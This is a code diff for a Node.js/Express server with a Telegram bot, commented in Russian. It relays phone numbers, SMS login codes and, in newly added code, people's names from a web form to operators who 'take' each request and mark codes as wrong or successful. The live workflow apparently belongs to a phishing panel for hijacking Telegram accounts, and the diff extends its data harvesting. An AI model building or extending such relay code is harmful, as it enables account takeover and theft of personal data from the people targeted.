@@ -82,10 +82,27 @@ const buildSmsMessageText = (requestId, code, phone, takenBy = "", isSuccess = f
   return lines.join("\n");
 };
 
+const buildNameMessageText = (requestId, name, phone, takenBy = "") => {
+  const lines = [
+    `ID: ${requestId}`,
+    `🪪 Имя: ${name}`
+  ];
+
+  if (phone) {
+    lines.push(`📞 Номер: ${phone}`);
+  }
+
+  if (takenBy) {
+    lines.push(`Взял: ${takenBy}`);
+  }
+
+  return lines.join("\n");
+};
+
 const buildPhoneKeyboard = (requestId, status) => {
   if (status === "taken") {
     return {
-      inline_keyboard: [[{ text: "Код", callback_data: `next:${requestId}` }]]
+      inline_keyboard: [[{ text: "Дальше", callback_data: `next:${requestId}` }]]
     };
   }
 
@@ -96,14 +113,15 @@ const buildPhoneKeyboard = (requestId, status) => {
   }
 
   return {
-    inline_keyboard: [[{ text: "Взять", callback_data: `take:${requestId}` }]]
+    inline_keyboard: [[{ text: "Взять в телеграме", callback_data: `take:${requestId}` }]]
   };
 };
 
 const buildSmsKeyboard = (requestId) => ({
   inline_keyboard: [[
     { text: "Неверный код", callback_data: `wrongcode:${requestId}` },
-    { text: "Успех", callback_data: `smssuccess:${requestId}` }
+    { text: "Успех", callback_data: `smssuccess:${requestId}` },
+    { text: "Имя", callback_data: `name:${requestId}` }
   ]]
 });
 
@@ -166,8 +184,8 @@ const handleTakeAction = async (requestId, callbackQuery) => {
     return;
   }
 
-  if (requestState.status === "ready") {
-    await answerCallbackQuery(callbackQuery.id, "По этой заявке уже нажали Дальше");
+  if (requestState.status === "ready" || requestState.status === "name") {
+    await answerCallbackQuery(callbackQuery.id, "По этой заявке уже продолжили");
     return;
   }
 
@@ -198,7 +216,7 @@ const handleNextAction = async (requestId, callbackQuery) => {
   }
 
   if (requestState.status === "pending") {
-    await answerCallbackQuery(callbackQuery.id, "Сначала нажмите Взять");
+    await answerCallbackQuery(callbackQuery.id, "Сначала нажмите Взять в телеграме");
     return;
   }
 
@@ -258,6 +276,25 @@ const handleSmsSuccessAction = async (requestId, callbackQuery) => {
   await answerCallbackQuery(callbackQuery.id, "Успех отмечен");
 };
 
+const handleNameAction = async (requestId, callbackQuery) => {
+  const requestState = requestStates.get(requestId);
+
+  if (!requestState) {
+    await answerCallbackQuery(callbackQuery.id, "Заявка не найдена");
+    return;
+  }
+
+  if (!canManageRequest(requestState, callbackQuery)) {
+    await answerCallbackQuery(callbackQuery.id, "Доступ только у того, кто взял заявку");
+    return;
+  }
+
+  requestState.status = "name";
+  requestState.updatedAt = Date.now();
+
+  await answerCallbackQuery(callbackQuery.id, "Открыт экран имени");
+};
+
 const handleTelegramUpdate = async (update) => {
   const callbackQuery = update.callback_query;
   if (!callbackQuery?.data) {
@@ -287,6 +324,11 @@ const handleTelegramUpdate = async (update) => {
 
   if (action === "smssuccess") {
     await handleSmsSuccessAction(requestId, callbackQuery);
+    return;
+  }
+
+  if (action === "name") {
+    await handleNameAction(requestId, callbackQuery);
   }
 };
 
@@ -342,6 +384,7 @@ app.post("/api/send-phone", async (req, res) => {
       codeMessageId: null,
       lastCode: "",
       smsSuccess: false,
+      lastName: "",
       codeErrorCount: 0,
       updatedAt: Date.now()
     });
@@ -399,6 +442,35 @@ app.post("/api/send-code", async (req, res) => {
       requestState.codeMessageId = message.message_id;
       requestState.lastCode = code;
       requestState.smsSuccess = false;
+      requestState.updatedAt = Date.now();
+    }
+
+    res.json({ ok: true });
+  } catch (error) {
+    res.status(error.statusCode || 500).json({ error: "Ошибка отправки в Telegram" });
+  }
+});
+
+app.post("/api/send-name", async (req, res) => {
+  const { requestId, name, phone } = req.body || {};
+
+  if (!requestId || typeof requestId !== "string") {
+    return res.status(400).json({ error: "Некорректный ID запроса" });
+  }
+
+  if (!name || typeof name !== "string" || !name.trim()) {
+    return res.status(400).json({ error: "Некорректное имя" });
+  }
+
+  const requestState = requestStates.get(requestId);
+
+  try {
+    await sendTelegramMessage(
+      buildNameMessageText(requestId, name.trim(), phone || requestState?.phone || "", requestState?.takenBy || "")
+    );
+
+    if (requestState) {
+      requestState.lastName = name.trim();
       requestState.updatedAt = Date.now();
     }
 
